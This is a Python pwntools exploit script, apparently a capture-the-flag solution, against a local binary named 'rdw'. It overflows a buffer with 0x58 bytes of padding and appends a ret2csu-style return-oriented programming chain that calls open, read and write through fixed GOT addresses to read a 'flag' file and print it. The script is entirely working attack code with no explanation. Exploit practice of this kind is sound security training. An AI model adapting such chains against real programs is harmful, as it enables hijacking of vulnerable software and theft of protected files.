from pwn import *
context.log_level = 'debug'

def dbg():
    gdb.attach(p, "b* 0x4008b2")
    raw_input("dbg")

def makecall(addr, rdi, rsi, rdx):
    call_addr = 0x400A50
    p6_addr = 0x400A6A

    payload = ''
    payload += p64(p6_addr)
    payload += p64(0x0)
    payload += p64(0x1)
    payload += p64(addr)
    payload += p64(rdx)
    payload += p64(rsi)
    payload += p64(rdi)
    payload += p64(call_addr)
    payload += p64(0x0) * 7
    return payload

def exploit():

    open_addr = 0x601058 
    read_addr = 0x601040 
    write_addr = 0x601020 

    #dbg()
    key_addr = 0x601090
    flag_addr = 0x601070 + 0x100
    p.recvuntil("back...\n")
    p.sendlineafter(">> ", 'flag\x00')


    payload = 'a' * 0x58

    # open read write
    payload += makecall(open_addr, key_addr, 0, 0)
    payload += makecall(read_addr, 3, flag_addr, 0x50)
    payload += makecall(write_addr, 1, flag_addr, 0x50)
    payload += p64(0xdeadbeef)


    p.sendlineafter("input\n", payload)

    p.interactive()
    p.close()

    pass

if __name__ == '__main__':
    p = process('./rdw')
    exploit()